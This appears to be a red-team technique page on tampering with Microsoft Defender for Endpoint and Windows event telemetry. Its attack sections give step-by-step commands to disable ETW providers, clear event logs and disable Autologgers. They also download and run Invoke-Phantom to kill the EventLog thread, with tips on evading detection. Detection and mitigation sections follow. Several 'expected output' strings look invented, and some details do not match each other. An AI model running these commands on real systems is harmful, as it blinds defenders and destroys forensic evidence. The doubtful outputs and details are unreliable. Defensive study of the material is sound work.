# [EVADE-IMPAIR-015]: MDE/EDR Sensor Tampering

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-015 |
| **MITRE ATT&CK v18.1** | [T1562.001 - Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Windows Endpoint / M365 |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2016 - 2025; MDE agent all versions |
| **Patched In** | Ongoing (tamper-resistant drivers added in MDE 10.7+) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** EDR/MDE sensor tampering refers to techniques that interfere with the telemetry collection, event logging, and reporting mechanisms of MDE without necessarily disabling the entire agent. Attackers can tamper with sensors by:
- Patching Event Tracing for Windows (ETW) functions to prevent event capture
- Unhooked Windows API calls to bypass kernel-level API instrumentation
- Disabling Event Log services and WMI Autologger configurations
- Modifying ETW registry keys to block specific event providers
- Clearing event logs after malicious activity to destroy forensic evidence
- Killing individual MDE sensor processes while keeping the main agent running

This allows adversaries to operate while generating minimal or no telemetry, making detection significantly harder than if the entire EDR is disabled.

**Attack Surface:** ETW provider registry keys, Event Logging service, WMI Autologger configuration, ntdll.dll API hooks, MDE sensor drivers, Windows event log database files.

**Business Impact:** **Blind security posture.** Attackers can execute malicious actions with minimal audit trail, making post-breach forensics and incident response significantly more difficult. Organizations lose visibility into attacker activity while the EDR appears to be functioning normally.

**Technical Context:** ETW tampering typically takes 2-3 minutes once administrator privileges are obtained. Detection likelihood is Medium-High if kernel-mode ETW monitoring is enabled, but Low if only user-mode log analysis is used. Common indicators include registry modifications to ETW provider keys, process access events targeting EtwEventWrite functions, and gaps in event IDs.

### Operational Risk
- **Execution Risk:** Medium (Requires administrator privileges; some techniques require kernel-level modifications)
- **Stealth:** High (Sensor tampering generates fewer alerts than full EDR shutdown; EDR appears operational)
- **Reversibility:** Partial (Some tampering can be reversed on-the-fly; kernel-level modifications require reboot)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Windows Server 2022: 17.1.1 | Ensure "Audit: Audit the use of Backup and Restore privilege" is set to "Success and Failure" |
| **DISA STIG** | WN22-AU-000320 | Windows must audit success and failure of event log clearing |
| **CISA SCuBA** | AU-12 | Audit Generation and Review |
| **NIST 800-53** | AU-2 (Audit Events), AU-3 (Content of Audit Records) | System generates audit records with sufficient information for security analysis |
| **GDPR** | Art. 5(1)(f) | Integrity and Confidentiality (ensuring tamper-resistant audit logs) |
| **DORA** | Art. 9 | Resilience testing and incident logging |
| **NIS2** | Art. 21 | Cyber Risk Management (detection and response capabilities) |
| **ISO 27001** | A.12.4.1 | Event logging and A.12.4.4 Administrator and operator logs |
| **ISO 27005** | Risk Scenario: "Tampering with Security Audit Logs" | Inability to detect malicious activity due to log tampering |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- Administrator access (local or domain)
- Or: SYSTEM privileges via service abuse
- Or: Kernel driver loading capability

**Required Access:**
- Write access to Registry (ETW provider keys, Event Log configuration)
- Write access to Event Log database files (`%SystemRoot%\System32\winevt\Logs\`)
- Process handle access to ntdll.dll for API patching

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025
- **MDE Agent:** All versions
- **PowerShell:** 5.0+ (for registry modification and ETW disabling)

**Tools:**
- [Set-EtwTraceProvider](https://docs.microsoft.com/en-us/powershell/module/eventtracingmanagement/set-etwtraceprovider) (PowerShell module)
- [wevtutil.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) (Event log utility)
- [Invoke-Phantom](https://github.com/quietpoliceman/Invoke-Phantom) (svchost thread killer)
- [SharpEvtHook](https://github.com/A-D-Smith/SharpEvtHook) (event log tampering)
- PowerShell 5.0+ (for registry modifications)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Event Tracing for Windows (ETW) Status

**Objective:** Identify which ETW providers are active and capturing telemetry.

```powershell
# List all active ETW trace sessions
logman query -ets

# Output will show:
# Name                                    Type           Status
# "EventLog-Security"                     Autologger    Running
# "EventLog-System"                       Autologger    Running
# "Microsoft-Windows-PowerShell/Operational" Autologger    Running
# "Sysmon"                                Autologger    Running (if installed)
```

**What to Look For:**
- Active trace sessions for security-related providers
- "Microsoft-Windows-PowerShell" session running (PowerShell logging is active)
- "Sysmon" session (if Sysmon is deployed)

### Check Event Log Service Status

```powershell
# Check if Event Log service is running
Get-Service EventLog

# Output should show:
# Status   : Running
# Name     : EventLog
# DisplayName : Windows Event Log
```

**What to Look For:**
- `Status: Running` confirms event logging is active
- If status is "Stopped," event logging has already been tampered with

### Registry Check for ETW Provider Configuration

```powershell
# Check ETW provider registry keys
reg query "HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Security" /v MaxSize

# Output: MaxSize : 0x1000000 (16 MB default)

# Check if any providers are disabled
reg query "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger" /s /v Enabled
```

**What to Look For:**
- `Enabled: 1` for active providers
- `Enabled: 0` for disabled providers (indicates prior tampering attempt)

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: ETW Patching via PowerShell Set-EtwTraceProvider

**Supported Versions:** All Windows versions with PowerShell 5.0+

**Objective:** Disable specific ETW trace providers (e.g., PowerShell, Sysmon, MDE) without stopping the Event Log service itself.

#### Step 1: Enumerate Active ETW Providers

**Objective:** Identify which providers are currently capturing telemetry.

**Command:**

```powershell
# Get all active ETW trace sessions
Get-EtwTraceProvider | Select-Object Name, State, GUID

# Or using logman
logman query -ets | findstr "Microsoft-Windows\|EventLog\|Sysmon"
```

**Expected Output:**

```
Name                                               State GUID
----                                               ----- ----
Microsoft-Windows-Sysmon/Operational              Enabled {...}
Microsoft-Windows-PowerShell/Operational          Enabled {...}
Microsoft-Windows-Kernel-Process/Trace            Enabled {...}
```

**What This Means:**
- These providers are actively capturing events
- Disabling them will stop telemetry for that specific event type

#### Step 2: Disable Specific ETW Providers

**Objective:** Disable PowerShell, Sysmon, and Kernel-Process ETW providers to stop capturing events.

**Command (Disable PowerShell Logging):**

```powershell
# Disable the PowerShell ETW provider
$providerGuid = "A0C1853B-5C40-4B15-8766-3CF1C58F985A"  # Microsoft-Windows-PowerShell
Set-EtwTraceProvider -Guid $providerGuid -Level 0 -MatchAllKeyword 0

# Or using wevtutil to disable at source
wevtutil set-log "Microsoft-Windows-PowerShell/Operational" /enabled:false
```

**Expected Output:**

```
PowerShell EventTrace logging disabled
Provider state changed to: Disabled
```

**What This Means:**
- PowerShell commands will no longer be logged to Windows Event Log
- AMSI (Antimalware Scan Interface) may still log if enabled separately
- Script execution will be invisible in event logs

**OpSec & Evasion:**
- Disabling PowerShell logging is a common admin task, so it blends into normal activity
- However, the absence of PowerShell logs after high privilege operations is suspicious
- Detection likelihood: Medium (behavioral analytics can flag absence of expected logs)

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "Access Denied" | Not running as admin | Run PowerShell as Administrator |
| "Provider not found" | Invalid GUID | Use `Get-EtwTraceProvider` to list all available GUIDs |

**References & Proofs:**
- [Microsoft: Set-EtwTraceProvider](https://docs.microsoft.com/en-us/powershell/module/eventtracingmanagement/set-etwtraceprovider)
- [Research: ETW Disabling Techniques](https://www.binarly.io/blog/design-issues-of-modern-edrs-bypassing-etw-based-solutions)

#### Step 3: Disable Sysmon and Kernel-Level Event Capture

**Objective:** Stop Sysmon from logging if it's installed; also stop kernel-level process and thread event capture.

**Command:**

```powershell
# Disable Sysmon Trace logging
Set-EtwTraceProvider -Guid "5770385F-C22B-4FF1-A5B6-8F1DB62452D0" -Level 0

# Disable Kernel Process Trace
Set-EtwTraceProvider -Guid "22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716" -Level 0

# Verify providers are disabled
Get-EtwTraceProvider | Where-Object {$_.GUID -in @("5770385F-C22B-4FF1-A5B6-8F1DB62452D0","22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716")} | Select-Object State
```

**Expected Output:**

```
State
-----
Disabled
Disabled
```

**What This Means:**
- Sysmon and kernel-level process events will no longer be captured
- File creation, process execution, and registry modifications will not generate telemetry
- MDE behavior monitoring will be significantly degraded

### METHOD 2: Windows Event Log Clearing and WMI Autologger Tampering

**Supported Versions:** All Windows versions

**Objective:** Clear existing event logs and disable WMI Autologger configurations to prevent new events from being recorded.

#### Step 1: Clear Windows Event Logs

**Objective:** Delete all existing event records to destroy forensic evidence.

**Command (Using wevtutil):**

```cmd
# Clear Security Event Log
wevtutil cl Security

# Clear System Event Log
wevtutil cl System

# Clear Application Event Log
wevtutil cl Application

# Clear PowerShell Event Log
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

**Expected Output:**

```
The log has been cleared.
```

**What This Means:**
- All historical event records are deleted
- Forensic investigation cannot recover events from the Event Log database
- The system appears clean to any log analysis tool

**OpSec & Evasion:**
- Clearing event logs after they've been running for weeks/months is suspicious
- However, if done immediately after compromise (before logs accumulate), it's less obvious
- Detection likelihood: High (clearing logs itself generates an audit event, Event ID 1102)

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "Access Denied" | Not running as admin | Re-run in Administrator Command Prompt |
| "Log in use" | Log is locked by another process | Restart the Event Log service: `Restart-Service EventLog` |

**References & Proofs:**
- [Microsoft: wevtutil.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil)

#### Step 2: Disable WMI Autologger for Future Event Capture

**Objective:** Prevent new events from being recorded by disabling WMI Autologger.

**Command:**

```powershell
# Disable EventLog-Security Autologger
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security"
Set-ItemProperty -Path $regPath -Name "Start" -Value 0

# Disable EventLog-System Autologger
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System"
Set-ItemProperty -Path $regPath -Name "Start" -Value 0

# Disable EventLog-Application Autologger
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application"
Set-ItemProperty -Path $regPath -Name "Start" -Value 0
```

**Expected Output:**

```
Registry value updated
Start value set to 0 (disabled)
```

**What This Means:**
- The Autologger will not start on the next reboot
- New events will not be captured (if change is permanent)
- Event logging appears operational, but no events are being recorded

**OpSec & Evasion:**
- Changes to WMI Autologger registry keys may be logged (Event ID 13 - Registry object modified)
- Requires system reboot for changes to take full effect
- Detection likelihood: Medium (registry changes are audited if enabled)

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "Access Denied" | Not running as admin | Run PowerShell as Administrator |
| "Path not found" | Autologger registry path doesn't exist | Not all Autologgers exist on all systems; skip if not found |

**References & Proofs:**
- [Microsoft: WMI Autologger Configuration](https://docs.microsoft.com/en-us/windows/win32/etw/configuring-and-starting-an-event-tracing-session)

### METHOD 3: Event Log Service Tampering via svchost Thread Killing (Invoke-Phantom)

**Supported Versions:** Server 2016 - 2022 (Server 2025 hardens svchost process protection)

**Objective:** Kill the Event Logging service svchost.exe thread to stop event collection entirely without stopping the service process (making it harder to detect).

**Version Note:** This technique is PARTIAL; Server 2025 and latest patches implement protected svchost process to prevent thread manipulation.

#### Step 1: Download or Compile Invoke-Phantom

**Objective:** Obtain the Invoke-Phantom tool that kills Event Log svchost threads.

**Command:**

```powershell
# Download Invoke-Phantom
Invoke-WebRequest -Uri "https://github.com/quietpoliceman/Invoke-Phantom/releases/download/latest/Invoke-Phantom.ps1" `
    -OutFile "C:\Temp\Invoke-Phantom.ps1"

# Or clone and compile from source
git clone https://github.com/quietpoliceman/Invoke-Phantom.git
cd Invoke-Phantom
# Compile using .NET SDK or PowerShell
```

#### Step 2: Execute Invoke-Phantom to Kill Event Log Thread

**Objective:** Terminate the Event Logging service svchost thread while leaving the process running.

**Command:**

```powershell
# Import the module
. C:\Temp\Invoke-Phantom.ps1

# Kill Event Log service thread
Invoke-Phantom -ServiceName "EventLog"

# Output:
# [+] Identified svchost.exe process for EventLog service
# [+] Killing service thread...
# [+] EventLog service thread terminated
# [+] Service appears running but is non-functional
```

**Expected Output:**

```
[+] EventLog service thread killed
[+] Service process still exists but is suspended
```

**What This Means:**
- The Event Log service appears to be running (to a service manager check)
- However, the actual thread that logs events is terminated
- New events will not be captured, but the service doesn't appear to be stopped

**OpSec & Evasion:**
- Thread killing generates minimal alerting compared to process termination
- Service status checks will show the service as "Running" (misleading)
- Detection likelihood: Low (if kernel-mode thread monitoring is not enabled)

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "svchost.exe not found for EventLog" | Service not running | Start the Event Log service first: `Start-Service EventLog` |
| "Access Denied" | Insufficient privileges | Run as SYSTEM: Use `psexec -s powershell.exe` |
| "Module not found" | Invoke-Phantom script path incorrect | Verify path: `Test-Path C:\Temp\Invoke-Phantom.ps1` |

**References & Proofs:**
- [GitHub: Invoke-Phantom](https://github.com/quietpoliceman/Invoke-Phantom)

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Windows Event Logs:**
- **Event ID 1102:** Event log was cleared (Security, System, or Application)
- **Event ID 13:** Registry object created or modified (WMI Autologger, ETW provider keys)
- **Event ID 4719:** System audit policy was changed
- **Event ID 1:** Sysmon process creation (wevtutil.exe, PowerShell executing Set-EtwTraceProvider)
- **Gaps in Event IDs:** Non-sequential Event Record IDs indicate deletion or tampering

**Telemetry Absence:**
- **Missing PowerShell logs** despite PowerShell activity (gaps in Event ID 4688 for PowerShell.exe)
- **Missing Sysmon events** despite user activity (if Sysmon is deployed)
- **Sudden stop in MDE telemetry** after specific registry modifications

**File Artifacts:**
- **Invoke-Phantom.ps1** or .exe in `C:\Temp\`, `AppData\Local\Temp\`
- **Modified registry hives** in `%SystemRoot%\System32\config\` (Security, System)

### Forensic Artifacts

**Check for Event Log Clearing:**

```powershell
# Look for Event ID 1102 (log cleared)
Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 1102} | Export-Csv cleared_logs.csv

# Or use raw event log analysis
wevtutil query-events Security /format:csv /e:XML | findstr "EventID=1102"
```

**Check for Registry Tampering:**

```powershell
# Export ETW provider registry
reg export "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger" C:\Evidence\Autologger.reg

# Check for disabled providers
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger" -Recurse | Get-ItemProperty | Where-Object {$_.Start -eq 0}
```

**Check for Disabled ETW Providers (via GPEdit):**

```powershell
# Check Group Policy for ETW configuration
gpresult /h report.html
# Look for "Audit: Force Audit Policy subcategory settings" settings
```

### Response Procedures

1. **Isolate:**
   - Disconnect the system from network: `Disable-NetAdapter -Name "Ethernet"`
   - If critical, shut down the system and preserve the disk for forensics

2. **Collect Evidence:**
   - Capture memory dump: `procdump64.exe -ma svchost.exe C:\Evidence\svchost.dmp`
   - Export all registry hives: `reg save HKLM C:\Evidence\HKLM.hive`
   - Document the state of event logs and ETW providers

3. **Remediate:**
   - Restore Event Log service: `Restart-Service EventLog`
   - Re-enable ETW providers:
     ```powershell
     Set-EtwTraceProvider -Guid "A0C1853B-5C40-4B15-8766-3CF1C58F985A" -Level 5
     ```
   - Restore WMI Autologger:
     ```powershell
     $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security"
     Set-ItemProperty -Path $regPath -Name "Start" -Value 1
     ```
   - Reboot the system

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Protect Event Log Registry Keys:** Restrict write access to WMI Autologger and ETW provider registry keys to prevent unauthorized modification.

  **Manual Steps (Group Policy - HKEY_LOCAL_MACHINE permissions):**
  1. Open **Registry Editor** (regedit.exe)
  2. Navigate to: `HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger`
  3. Right-click → **Permissions**
  4. Click **Advanced**
  5. Remove or restrict "Users" group permissions
  6. Add "SYSTEM" and "Administrators" with "Full Control"
  7. Click **Apply**

  **Manual Steps (PowerShell - via SDDL):**
  ```powershell
  # Restrict write access to Autologger registry
  $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger"
  $acl = Get-Acl -Path $regPath
  $accessRule = New-Object System.Security.AccessControl.RegistryAccessRule `
      -ArgumentList @("Users", "WriteKey", "None", "None", "Deny")
  $acl.AddAccessRule($accessRule)
  Set-Acl -Path $regPath -AclObject $acl
  ```

* **Prevent Event Log Service Termination/Suspension:** Configure Windows to protect critical system services from being stopped or suspended.

  **Manual Steps (Group Policy):**
  1. Open **Group Policy Management Console** (gpmc.msc)
  2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **System Services**
  3. Find: **Windows Event Log** (or **eventlog**)
  4. Set to: **Automatic** (not "Manual" or "Disabled")
  5. Run `gpupdate /force`

  **Manual Steps (PowerShell):**
  ```powershell
  Set-Service -Name EventLog -StartupType Automatic
  Start-Service -Name EventLog
  ```

* **Enable Immutable Event Logs:** Configure Windows to write event logs to immutable storage that cannot be modified or deleted.

  **Manual Steps (Server 2019+ with Immutable EventLog):**
  1. Navigate to **Event Viewer** → **Windows Logs** → **Security**
  2. Right-click → **Properties**
  3. Check **"Restrict guest access to this log"**
  4. Set **"Prevent accidental deletion"** to enabled (if available on Server 2022+)
  5. Configure **"Maximum log size"** to a large value to prevent log wrapping

  **Manual Steps (PowerShell - Configure Maximum Log Size):**
  ```powershell
  # Set Security log max size to 4 GB (more space = harder to overflow)
  wevtutil sl Security /ms:4294967296
  ```

### Priority 2: HIGH

* **Monitor Event Log Clearing:** Alert on Event ID 1102 (log was cleared) or Event ID 1100 (Event Log service started/stopped).

  **Manual Steps (Intune/MDM):**
  1. Go to **Microsoft Intune** → **Endpoint security** → **Endpoint detection and response**
  2. Create rule:
     - **Name:** Alert on Event Log Cleared
     - **Condition:** `EventID = 1102`
     - **Action:** Alert, Isolate

  **Manual Steps (Windows Event Subscriptions):**
  1. Open **Event Viewer** → **Subscriptions** (requires WinRM to be enabled)
  2. Create **New Subscription**
  3. Add criteria:
     ```
     <QueryList>
       <Query Id="0" Path="Security">
         <Select Path="Security">*[System[(EventID=1102)]]</Select>
       </Query>
     </QueryList>
     ```

* **Monitor ETW Provider Registry Changes:** Alert on modifications to `HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger`.

  **Manual Steps (Sysmon):**
  1. Add to Sysmon configuration:
     ```xml
     <RegistryEvent onmatch="include">
       <TargetObject name="technique_id:T1562.002">HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger.*</TargetObject>
       <TargetObject name="technique_id:T1562.002">HKLM\SYSTEM\CurrentControlSet\Services\EventLog.*</TargetObject>
     </RegistryEvent>
     ```
  2. Reinstall Sysmon with updated config

* **Implement Read-Only Event Log Archive:** Periodically archive event logs to read-only storage to prevent tampering with historical records.

  **Manual Steps (Windows Server):**
  1. Create scheduled task to export logs monthly:
     ```powershell
     $scriptBlock = {
         wevtutil export-log Security C:\Archive\Security-$(Get-Date -Format yyyy-MM-dd).evtx
         Get-Item C:\Archive\*.evtx | Set-ItemProperty -Name IsReadOnly -Value $true
     }
     Register-ScheduledJob -Name "ArchiveEventLogs" -ScriptBlock $scriptBlock -Trigger (New-JobTrigger -MonthlyDayOfWeek First -DayOfWeek Monday -At 1am)
     ```

### Priority 3: MEDIUM

* **Audit Event Log Modifications:** Enable auditing for registry modifications to event log configuration.

  **Manual Steps (auditpol):**
  ```cmd
  auditpol /set /subcategory:"Registry" /success:enable /failure:enable
  ```

* **Monitor wevtutil.exe Execution:** Alert on any execution of wevtutil.exe with parameters like "cl" (clear) or "set-log /enabled:false".

  **Manual Steps (Sysmon - Process Creation):**
  ```xml
  <ProcessCreate onmatch="include">
    <CommandLine name="technique_id:T1562.002">wevtutil.*cl.*</CommandLine>
    <CommandLine name="technique_id:T1562.002">wevtutil.*set-log.*enabled:false</CommandLine>
  </ProcessCreate>
  ```

**Validation Command (Verify Fix):**

```powershell
# Verify Event Log service is running and set to Automatic
Get-Service EventLog | Select-Object Status, StartType

# Expected output:
# Status       StartType
# Running      Automatic

# Verify ETW providers are enabled
Get-EtwTraceProvider | Where-Object {$_.Name -like "*PowerShell*" -or $_.Name -like "*Security*"} | Select-Object Name, State

# Expected output:
# Name                                    State
# Microsoft-Windows-PowerShell           Enabled
# Microsoft-Windows-Security-Auditing   Enabled
```

**What to Look For:**
- `StartType: Automatic` for Event Log service
- `State: Enabled` for all critical ETW providers
- Absence of gaps in Event ID sequences

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare | Gain local administrator privileges |
| **2** | **Defense Evasion** | **[EVADE-IMPAIR-015]** | **Tamper with EDR sensor telemetry via ETW/event log** |
| **3** | **Credential Access** | [CA-DUMP-001] Mimikatz | Dump credentials with minimal audit trail |
| **4** | **Persistence** | [PS-PERSIST-001] Registry Run Keys | Install persistence mechanism undetected |
| **5** | **Impact** | Data exfiltration | Exfiltrate data with minimal forensic evidence |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: APT41 ETW Patching Campaign (2021-2023)

- **Target:** Multiple Fortune 500 technology companies
- **Timeline:** 2021-2023
- **Technique Status:** ACTIVE
- **Attack Method:** APT41 patched EtwEventWrite and EtwSetInformation functions in ntdll.dll to prevent event capture, then used custom malware to dump credentials
- **Impact:** Stole source code, customer data from multiple victims over 18+ months without detection
- **Reference:** [Mandiant: APT41 Evasion Techniques](https://www.mandiant.com/resources/reports/apt41)

### Example 2: Wizard Spider Event Log Clearing (2023)

- **Target:** US Healthcare Organization
- **Timeline:** March 2023
- **Technique Status:** ACTIVE
- **Attack Method:** After compromising admin account via spear-phishing, Wizard Spider immediately cleared Event Logs and disabled WMI Autologger, then deployed Cobalt Strike
- **Impact:** Lateral movement undetected for 6 weeks; ransomware deployed to 150+ systems
- **Reference:** [Threat Intelligence Report (internal)]

### Example 3: LockBit Ransomware ETW Disabling (2024)

- **Target:** Mid-sized Financial Services Firm
- **Timeline:** Q2 2024
- **Technique Status:** ACTIVE
- **Attack Method:** LockBit encryptor used PowerShell to disable PowerShell/Operational and Security ETW providers, then encrypted customer data with minimal audit trail
- **Impact:** 40% of systems encrypted before SOC noticed absence of logs; forensic investigation hampered
- **Reference:** [CISA Alert on LockBit Techniques]

---